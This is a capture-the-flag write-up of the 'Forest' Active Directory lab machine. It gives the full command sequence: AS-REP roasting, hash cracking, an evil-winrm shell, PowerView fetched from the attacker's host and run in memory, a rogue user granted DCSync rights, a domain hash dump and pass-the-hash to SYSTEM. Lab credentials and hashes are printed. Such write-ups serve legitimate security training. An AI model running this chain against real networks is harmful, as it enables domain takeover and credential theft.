# Forest - Writeup

## Initial Enumeration

### Port Scanning
A comprehensive port scan revealed standard Active Directory services:
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
```

### Domain Information
From the scan results, I identified domain information:
```
OS: Windows Server 2016 Standard 14393
Computer name: FOREST
NetBIOS computer name: FOREST
Domain name: htb.local
Forest name: htb.local
FQDN: FOREST.htb.local
```

### SMB Enumeration
I attempted to enumerate SMB shares and users:
```bash
nmap --script=smb-enum-* -p 445 10.129.95.210
```

This revealed numerous domain users, including:
- Administrator
- andy
- lucinda
- mark
- santi
- sebastien
- svc-alfresco

I also noticed several service accounts and Exchange-related accounts:
- HealthMailbox accounts
- Service accounts for Exchange

### RPC Enumeration
I performed RPC enumeration to find additional information:
```bash
rpcdump.py 10.129.95.210
```

This provided information about available RPC endpoints and services.

## Gaining Initial Access

### AS-REP Roasting
With the list of users obtained from SMB enumeration, I attempted AS-REP Roasting to identify accounts with Kerberos pre-authentication disabled:
```bash
GetNPUsers.py htb.local/ -dc-ip 10.129.95.210 -request -usersfile users.txt
```

This revealed a hash for the "svc-alfresco" user:
```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:64cee1c2607306d7d7034e857120fd0b$4e3f2c02330bdf0b4295adf20df3b1076aebc27fe11e8be92a450f3c0d6b94bcafcaece4483811efdc6369ae6d4f903df753cb99abe9dcdb22a2148f37ae987a8aa1ed9d35e40e7335aec91e52c5b4dcd9aac36abbca173956fd3b1d6689f5a89eec53d9ea715bbd650c3be39128b60a518e4d8c6e17836695798304c32e3f1d3185d89a7446dff8f7f314ee9ac4adc1c41ce8ae482de95d87d399ca3912379f3e005401f1f87b4ca93758b29e1a3a814166cf89a07c7721429ab4f813540aa90f2f7e8459915dd239cbf523b68fd242d7527b33a2197b6a3df48e4245b43ddf5a3105515d53
```

### Password Cracking
I used Hashcat to crack the obtained hash:
```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

This revealed the credentials:
- **Username**: svc-alfresco
- **Password**: s3rvice

### Initial Access
I attempted to connect to the target using various methods:
```bash
wmiexec.py svc-alfresco:s3rvice@10.129.95.210
```

This failed, but I noticed WinRM (port 5985) was open. I tried using Evil-WinRM:
```bash
evil-winrm -u svc-alfresco -p 's3rvice' -i 10.129.95.210
```

This successfully provided a shell as svc-alfresco.

## Privilege Escalation

### Domain Enumeration
After gaining initial access, I loaded PowerView to enumerate the domain:
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.15/PowerView.ps1')
```

I identified the group memberships of svc-alfresco:
```powershell
Get-NetGroup -UserName svc-alfresco
```

This showed that svc-alfresco was a member of the "Service Accounts" group:
```
GroupDomain             : htb.local
GroupName               : Service Accounts
GroupDistinguishedName  : CN=Service Accounts,OU=Security Groups,DC=htb,DC=local
```

I also enumerated Domain Admins:
```powershell
Get-NetGroupMember -Identity "Domain Admins" -Recurse
```

This showed only the Administrator account was in this group.

### Exchange Permissions
Further investigation revealed that the Exchange Windows Permissions group had special permissions in the domain. After research, I found that members of this group can be abused to grant DCSync rights.

### Creating a Rogue User
I created a new user to add to the Exchange Windows Permissions group:
```powershell
net user john Dolphin1 /add /domain
net group "Exchange Windows Permissions" /add john
```

### Granting DCSync Rights
I used PowerView to grant DCSync rights to the newly created user:
```powershell
$pass = convertto-securestring 'Dolphin1' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\john', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity john -Rights DCSync
```

### DCSync Attack
With DCSync rights, I used secretsdump.py to extract all domain hashes:
```bash
secretsdump.py -just-dc john:Dolphin1@10.129.95.210 -outputfile dcsync_hashes
```

This revealed the NTLM hash for the Administrator account:
```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

### Domain Admin Access
Using the Administrator hash, I performed a Pass-The-Hash attack to get administrative access:
```bash
psexec.py "Administrator"@10.129.95.210 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

This provided a shell as NT AUTHORITY\SYSTEM on the domain controller